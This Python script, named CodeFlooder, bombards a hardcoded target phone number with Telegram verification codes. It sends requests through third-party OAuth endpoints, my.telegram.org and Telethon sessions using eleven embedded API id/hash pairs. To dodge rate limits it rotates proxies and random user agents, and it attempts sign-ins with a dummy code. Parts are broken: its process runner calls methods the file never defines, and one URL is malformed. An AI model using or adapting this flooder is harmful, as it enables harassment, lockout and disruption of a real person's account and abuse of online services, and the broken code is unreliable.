from requests import post, get
from fake_useragent import FakeUserAgent
from typing import List, AnyStr
from random import choice as random
from telethon.sync import TelegramClient
from telethon.errors import SessionPasswordNeededError, FloodWaitError
from multiprocessing import Process
from os import system, remove



ua = FakeUserAgent()
urls = [
        'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
        'https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
        'https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https%3A%2F%2Fmipped.com&embed=1&request_access=write&return_to=https%3A%2F%2Fmipped.com%2Ff%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
        'https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz&return_to=https%3A%2F%2Fwww.spot.uz%2Fru%2F2022%2F04%2F29%2Fyoto%2F%23',
        'https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftbiz.pro&embed=1&request_access=write&return_to=https%3A%2F%2Ftbiz.pro%2Flogin',
        'https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1&return_to=https%3A%2F%2Ftelegrambot.biz%2F',
        'https://oauth.telegram.org/auth/request?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&return_to=https%3A%%2Fbot-t.com%2Flogin',
        'https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1&request_access=write&return_to=https%3A%2F%2Fru.telegram-store.com%2Fcatalog%2Fsearch',
        'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin',
    ] 
weburls = ["https://my.telegram.org/auth/send_password"] * 10



class CodeFlooder:
    def __init__(self, phone: str, proxies: List[AnyStr]) -> None:
        self.phone = phone
        self._sended = 0
        self._not_sended = 0
        self.proxies = proxies
        self.formatted_proxies = []
        self._proxy_formatting()
        self._proc_list = []    
        self.tgc_params = (
            (25389095, "a715da4e82e7a2bab63fef6364c62596"),
            (20045757, "7d3ea0c0d4725498789bd51a9ee02421"),
            (22622166, "e4de2de0112314c46f74e98f4d050407"),
            (24949722, "a8a777fc5040107fd530db1c667f7614"),
            (29284143, "da75ef1e4f3541693d9a055e33de8455"),
            (20714117, "a3c45125f6813ea111ced164ecb8e59d"),
            (24167417, "f486b0105559a1faea675ee4f0d82bbc"),
            (16854491, "1bdddbaf9580d03fdd6c51490283a434"),
            (19748984, "2141e30f96dfbd8c46fbb5ff4b197004"),
            (27963195, "e942da81598725f69e5f206d89accf2b"),
            (25191300, "6ae3666093a2efcada17149d5ec442c9")
        )


    def RunAsProcesses(self, verbose: bool=True):
        if self._proc_list != []:
            for proc in self._proc_list:
                proc.terminate()
        # system("cls")
        if verbose: print(f"All processes ended, send result: good - {self._sended}, bad - {self._not_sended}")
        self._proc_list = []
        self._sended = 0
        self._not_sended = 0
        bt = Process(target=self._send_bot, args=(verbose,))
        wb = Process(target=self._send_web, args=(verbose,))
        lg = Process(target=self._send_log, args=(verbose,))
        bt.start()
        wb.start()
        lg.start()



    def WaitForEnd(self):
        for proc in self._proc_list:
            proc.join()
        return self._sended, self._not_sended



    def _proxy_formatting(self):
        for proxy in self.proxies:
            pr = {}
            if "@" in proxy:
                pr['proxy_type'] = proxy.split("://")[0]
                pr['addr'] = proxy.replace(pr["proxy_type"] + '://', "").split("@")[1].split(":")[0]
                pr['port'] = int(proxy.replace(pr["proxy_type"] + '://', "").split("@")[1].split(":")[1])
                pr['username'] = proxy.replace(pr["proxy_type"] + '://', "").split("@")[0].split(":")[0]
                pr['password'] = proxy.replace(pr["proxy_type"] + '://', "").split("@")[0].split(":")[1]
            else:
                pr['proxy_type'] = proxy.split("://")[0]
                pr['addr'] = proxy.replace(pr["proxy_type"] + '://', "").split(":")[0]
                pr['port'] = int(proxy.replace(pr["proxy_type"] + '://', "").split(":")[1])
            self.formatted_proxies.append(pr)


    def _send(self):
        for url in urls:
            try:
                proxy = random(self.proxies)
                res = post(url, headers={'User-Agent': ua.random}, data={'phone': self.phone}, proxies={"http": proxy, "https": proxy}, timeout=10)
                if res.status_code == 200:
                    self._sended += 1
                else:
                    self._not_sended += 1
            except Exception as e:
                self._not_sended += 1
                print(f"BAD - {e}")
        for url in weburls:
            try:
                proxy = random(self.proxies)
                res = post(url, headers={'User-Agent': ua.random}, data={'phone': self.phone}, proxies={"http": proxy, "https": proxy}, timeout=10)
                if res.status_code == 200:
                    self._sended += 1
                else:
                    self._not_sended += 1
            except Exception as e:
                self._not_sended += 1
                print(f"BAD - {e}")
        for _ in range(10):
            session_path = f"sessions/{generate_rand_str(10)}.session"
            try:
                tgc = TelegramClient(session_path , *random(self.tgc_params), proxy=random(self.formatted_proxies))
                tgc.connect()
                res = tgc.send_code_request(self.phone)
                try:
                    tgc.sign_in(self.phone, "11111", phone_code_hash=res.phone_code_hash)
                except SessionPasswordNeededError:
                    tgc.sign_in(self.phone, "11111", password="1", phone_code_hash=res.phone_code_hash)
                self._sended += 1
            except FloodWaitError:
                print("Пизда рулю, словили FLOODWAIT")
            except Exception as e:
                self._not_sended += 1
            try: tgc.disconnect()
            except: ...
            remove(session_path)



def check_proxies(proxies, verbose: bool = False):
    if proxies is None or len(proxies) == 0:
        proxies = None
        return None
    else:
        good_l = []
        for proxy in proxies:
            if verbose: print(f"try: {proxy}", end=" ")
            try:
                get("https://jsonip.com", proxies={"http": proxy, "https": proxy}, timeout=5)
                good_l.append(proxy)
                if verbose: print("GOOD")
            except: 
                if verbose: print("BAD")
        return good_l


def generate_rand_str(len):
    return "".join([random("qwertyuioplkjhgfdsazxcvbnm") for _ in range(len)])



if __name__ == "__main__":
    proxies = open("proxies.txt").read().split("\n")
    pon = CodeFlooder("62895392749525", check_proxies(proxies, True)) # 7 985 412 4123
    system("cls")
    # pon.RunAsProcesses(True)
    # print(pon.WaitForEnd())
    # print(pon.send_codes(True))